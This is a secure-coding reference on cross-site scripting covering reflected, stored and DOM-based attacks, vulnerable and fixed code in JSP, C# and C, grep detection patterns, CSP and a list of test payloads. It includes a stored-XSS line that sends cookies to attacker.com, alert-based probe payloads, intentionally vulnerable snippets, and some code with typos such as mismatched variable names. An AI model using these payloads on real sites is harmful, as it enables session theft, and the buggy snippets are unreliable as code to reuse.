# Cross-Site Scripting (XSS) (CWE-79)

**Severity**: 🔴 CRITICAL
**Category**: Input Validation & Representation
**OWASP Top 10**: A03:2021 – Injection

---

## Overview

### Attack Description

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. When unvalidated external input is used in dynamic web page generation, inappropriate scripts can execute with the privileges of the user viewing the trusted web page, leading to information disclosure and other attacks. When a vulnerable application doesn't properly validate/sanitize user input before displaying it, attackers can inject JavaScript that executes in victims' browsers, stealing cookies, session tokens, or performing actions on behalf of the user.

### XSS Attack Types

There are three main XSS attack methods:

**1. Reflected XSS**
The attack occurs when a server sends a response containing the malicious script included in a URL parameter received from external input, such as in search results or error messages. The attack induces users to click URLs with embedded attack scripts through emails, messengers, or other means, making it difficult for users to easily identify the malicious URL.

**2. Stored XSS**
The attacker injects malicious scripts through input forms such as bulletin boards, comment fields, or user profiles. The scripts are stored in the database, and when users visit the site and view pages containing the stored scripts, the server delivers the malicious scripts, which execute in the user's browser.

**3. DOM-based XSS**
The attack occurs when malicious scripts included in URL parameter values from external input are executed as part of DOM generation without going through the server. Unlike Reflected XSS and Stored XSS, where malicious scripts are included in response pages due to server application vulnerabilities and delivered to the browser, DOM-based XSS occurs independently of the server.

---

## Security Measures

### Key Principles

Perform string validation to prevent scripts from being inserted into external input or output values, or ensure selection from a predefined safe list. Specifically, replace characters such as `& < > " ' / ( )` with their HTML entities `&amp; &lt; &gt; &quot; &#x27; &#x2F; &#x28; &#x29;`, or use JSTL or well-known XSS prevention libraries. For bulletin boards that allow HTML tags, create a whitelist of allowed HTML tags and only support those tags.

**Primary Defenses:**

1. **Output Encoding**
   - HTML encode all user input before display
   - Use proper encoding for context (HTML, JavaScript, URL, CSS)
   - Encode special characters: `<`, `>`, `&`, `"`, `'`, `/`

2. **Use Safe APIs**
   - JSTL `<c:out>` tag (auto-encoding)
   - Framework templating with auto-escaping
   - OWASP Java Encoder library
   - AntiXSS libraries

3. **Input Validation**
   - Whitelist allowed HTML tags (if HTML needed)
   - Validate input format (email, phone, etc.)
   - Reject dangerous patterns

4. **Content Security Policy (CSP)**
   - HTTP header to restrict script sources
   - Prevents inline script execution
   - Defense in depth

5. **HttpOnly Cookies**
   - Prevent JavaScript access to session cookies
   - Mitigates XSS cookie theft

---

## Code Examples

### Attack Scenario

**Reflected XSS Example:**
```
http://example.com/search?keyword=<script>alert(document.cookie)</script>
```
If the application displays: "Search results for: [keyword]", the script executes.

**Stored XSS Example:**
Attacker posts comment: `<script>fetch('https://attacker.com?cookie='+document.cookie)</script>`
Every user viewing the comment sends their cookies to attacker.

**DOM-based XSS Example:**
```javascript
document.write("keyword:" + <%=keyword%>);
```
If keyword contains `<script>`, it executes in browser.

---

### ❌ Vulnerable Code

#### Java JSP - Reflected XSS

```jsp
<% String keyword = request.getParameter("keyword"); %>
// External input value is displayed on screen without validation, allowing creation
// of URLs containing attack scripts - unsafe (Reflected XSS)
Search keyword: (<%=keyword%>)
```

**Problem:** User input directly embedded in HTML without encoding.

#### Java JSP - Stored XSS

```jsp
// External values stored in DB via input forms such as bulletin boards are displayed
// on screen without validation, allowing attack scripts to execute - unsafe (Stored XSS)
Search results: $ {m.content}
```

**Problem:** Database content displayed without encoding.

#### JavaScript - DOM-based XSS

```jsp
<script type="text/javascript">
// External input value executes in the browser without validation, allowing creation
// of URLs containing attack scripts that bypass the server - unsafe (DOM-based XSS)
document.write("keyword:" + <%=keyword%>);
</script>
```

**Problem:** User input embedded in JavaScript executed by browser.

---

### ✅ Secure Code

#### Java JSP - Using JSTL <c:out>

```jsp
<% String keyword = request.getParameter("keyword"); %>
// Method 1: Replace characters that could enable script attacks in input values
keyword = keyword.replaceAll("&", "&amp;");
keyword = keyword.replaceAll("<", "&lt;");
keyword = keyword.replaceAll(">", "&gt;");
keyword = keyword.replaceAll("\"", "&quot;");
keyword = keyword.replaceAll("'", "&#x27;");
keyword = keyword.replaceAll("/", "&#x2F;");
keyword = keyword.replaceAll("(", "&#x28;");
```

**Method 1: Manual Encoding**
- Replace special characters with HTML entities
- Tedious and error-prone
- Better: Use libraries

#### JSTL - Auto-Encoding

```jsp
<% String keyword = request.getParameter("keyword"); %>
// Method 2: Use JSTL c:out for output in JSP
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/functions" prefix="fn" %>
Search results: <c:out value="$ {m.content}"/>
```

**Method 2: JSTL <c:out>**
- Automatic HTML encoding
- Recommended for JSP

#### OWASP Java Encoder

```jsp
<script type="text/javascript">
// Method 3: Use well-established external libraries (NAVER Lucy-XSS-Filter, OWASP ESAPI,
//     OWASP Java-Encoder-Project)
document.write("keyword:"+
  <%=Encoder.encodeForJS(Encoder.encodeForHTML(keyword))%>);
</script>
```

**Method 3: OWASP Encoder**
- Context-aware encoding
- `encodeForHTML()`, `encodeForJS()`, `encodeForURL()`, etc.
- Most reliable solution

---

### C# Example

#### ❌ Vulnerable C#

```csharp
string usrInput = Request.QueryString["ID"];
// External input value is displayed on screen without validation
string str = "ID : " + usrinput;
Request.Write(str);
```

#### ✅ Secure C# with AntiXss

```csharp
string usrInput = Request.QueryString["ID"];
string str = "ID : " + usrinput;
// Use packages like AntiXss to filter external input values
var sanitizedStr = Sanitizer.GetSafeHtmlFragment(str);
quest.Write(sanitizedStr);
```

---

### C Example

#### ❌ Vulnerable C (CGI)

```c
int XSS(int argc, char* argv[]) {
    unsigned int i = 0;
    char data[1024];
    ......
    // User input received via cgiFromString is displayed on screen without validation
    cgiFromString("user input", data, sizeof(data));
    printf(cgiOut, "Print user input = %s<br/>", data);
    printf(cgiOut, "</body></html>\n");
    return 0;
}
```

#### ✅ Secure C with Validation

```c
cgiFromString("user input", data, sizeof(data));
// Add code to check for allowed character strings in CGI
if(strchr(p, '(')) return;
if(strchr(p, ')')) return;
...
fprintf(cgiOut, "Print user input = %s<br/>", data);
fprintf(cgiOut, "</body></html>\n");
```

---

## References

### CWE (Common Weakness Enumeration)

① **CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')**
   MITRE, http://cwe.mitre.org/data/definitions/79.html

### CERT

② **Properly encode or escape output**
   CERT, http://www.securecoding.cert.org/confluence/display/java/IDS51-J.+Properly+encode+or+escape+output

### OWASP

③ **XSS (Cross Site Scripting) Prevention Cheat Sheet**
   OWASP, http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet

④ **DOM based XSS Prevention Cheat Sheet**
   OWASP, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet

⑤ **Understanding Malicious Content Mitigation for Web Developers**
   http://www.cert.org/tech_tips/malicious_code_mitigation.html

---

## 🔍 Detection Patterns (Grep/Search)

```bash
# Find JSP with unencoded output
grep -r "<%=.*request\\.getParameter" *.jsp
grep -r "\${param\\." *.jsp
grep -r "\${.*}" *.jsp | grep -v "c:out"

# Find JavaScript with user input
grep -r "document\\.write.*<%=" *.jsp
grep -r "innerHTML.*request" .

# Find Response.write in Java
grep -r "response\\.getWriter.*request" .
grep -r "PrintWriter.*write.*request" .
```

---

## ✅ Security Checklist

- [ ] All user input HTML-encoded before display
- [ ] JSTL `<c:out>` used instead of `${}` in JSP
- [ ] OWASP Java Encoder used for context-aware encoding
- [ ] Input validation applied (whitelist approach for HTML)
- [ ] Content-Security-Policy header configured
- [ ] HttpOnly flag set on session cookies
- [ ] X-XSS-Protection header enabled
- [ ] No inline JavaScript (use external files)
- [ ] Framework auto-escaping enabled (Spring, Thymeleaf, etc.)
- [ ] Regular security testing for XSS vulnerabilities

---

## 🎯 Encoding by Context

Different contexts require different encoding:

### HTML Context
```jsp
<div><c:out value="${userInput}"/></div>
<!-- Encodes: < > & " ' -->
```

### JavaScript Context
```jsp
<script>
var name = "<%=Encoder.encodeForJS(userName)%>";
</script>
```

### URL Context
```jsp
<a href="/search?q=<%=URLEncoder.encode(query, "UTF-8")%>">Search</a>
```

### CSS Context
```jsp
<div style="color: <%=Encoder.encodeForCSS(userColor)%>">Text</div>
```

---

## 🛡️ Content Security Policy (CSP)

Add CSP header to prevent XSS:

```java
// In Servlet Filter or Spring Security
response.setHeader("Content-Security-Policy",
    "default-src 'self'; " +
    "script-src 'self' https://trusted-cdn.com; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self' https://fonts.gstatic.com; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none'; " +
    "base-uri 'self'; " +
    "form-action 'self';"
);
```

**Benefits:**
- Blocks inline scripts
- Restricts script sources to whitelist
- Prevents eval() and similar functions
- Defense in depth even if encoding fails

---

## 💡 Framework-Specific Solutions

### Spring MVC
```java
// Auto-escaping in Thymeleaf
<div th:text="${userInput}"></div>  <!-- Safe -->
<div th:utext="${userInput}"></div> <!-- Unsafe! -->
```

### JSF
```xhtml
<!-- Auto-escaping by default -->
<h:outputText value="#{bean.userInput}"/>
```

### OWASP Java Encoder
```java
import org.owasp.encoder.Encode;

String safe = Encode.forHtml(userInput);
String safeJs = Encode.forJavaScript(userInput);
String safeUrl = Encode.forUriComponent(userInput);
```

---

## 🚨 Common Mistakes

1. **Double Encoding**
   ```jsp
   <!-- DON'T: Double encoding -->
   <c:out value="<%=Encode.forHtml(input)%>"/>
   ```

2. **Wrong Context**
   ```jsp
   <!-- DON'T: HTML encoding in JavaScript -->
   <script>var x = "<c:out value='${input}'/>";</script>
   ```

3. **Trusting "Internal" Data**
   ```jsp
   <!-- DON'T: Database data can contain XSS -->
   ${article.content} <!-- Still needs encoding! -->
   ```

---

## 🔬 Testing for XSS

### Basic Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">
```

### Tools
- **OWASP ZAP**: Automated XSS scanner
- **Burp Suite**: Manual testing and scanner
- **XSS Hunter**: Find blind XSS
- **Browser DevTools**: Test in console

---

**Always encode user input before displaying - Use JSTL <c:out> or OWASP Encoder!**
